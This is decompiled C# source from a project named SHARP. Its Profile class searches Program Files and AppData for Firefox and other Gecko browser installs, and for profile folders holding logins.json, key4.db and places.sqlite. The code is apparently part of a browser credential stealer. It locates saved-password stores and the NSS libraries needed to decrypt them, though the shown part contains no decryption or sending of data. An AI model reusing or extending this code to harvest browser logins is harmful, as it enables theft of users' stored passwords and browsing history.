﻿using System;
using System.Collections.Generic;
using System.IO;

namespace SHARP
{
	// Token: 0x02000015 RID: 21
	internal class Profile
	{
		// Token: 0x06000077 RID: 119 RVA: 0x00003290 File Offset: 0x00001490
		private static string[] Concat(string[] x, string[] y)
		{
			if (x == null)
			{
				throw new ArgumentNullException("x");
			}
			if (y == null)
			{
				throw new ArgumentNullException("y");
			}
			int destinationIndex = x.Length;
			Array.Resize<string>(ref x, x.Length + y.Length);
			Array.Copy(y, 0, x, destinationIndex, y.Length);
			return x;
		}

		// Token: 0x06000078 RID: 120 RVA: 0x000032D8 File Offset: 0x000014D8
		private static string[] ProgramFilesChildren()
		{
			string[] array = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
			if (8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
			{
				array = Profile.Concat(array, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
			}
			return array;
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00003328 File Offset: 0x00001528
		public static string GetProfile(string path)
		{
			try
			{
				string path2 = Path.Combine(path, "Profiles");
				if (Directory.Exists(path2))
				{
					foreach (string text in Directory.GetDirectories(path2))
					{
						if (File.Exists(text + "\\logins.json") || File.Exists(text + "\\key4.db") || File.Exists(text + "\\places.sqlite"))
						{
							return text;
						}
					}
				}
			}
			catch (Exception ex)
			{
				string str = "Failed to find profile\n";
				Exception ex2 = ex;
				Console.WriteLine(str + ((ex2 != null) ? ex2.ToString() : null));
			}
			return null;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x000033D4 File Offset: 0x000015D4
		public static string GetMozillaPath()
		{
			foreach (string text in Profile.ProgramFilesChildren())
			{
				if (File.Exists(text + "\\nss3.dll") && File.Exists(text + "\\mozglue.dll"))
				{
					return text;
				}
			}
			return null;
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00003420 File Offset: 0x00001620
		public static string[] GetMozillaBrowsers()
		{
			List<string> list = new List<string>();
			foreach (string path in Paths.sGeckoBrowserPaths)
			{
				string text = Path.Combine(Paths.appdata, path);
				if (Directory.Exists(text))
				{
					list.Add(text);
				}
			}
			return list.ToArray();
		}
	}
}
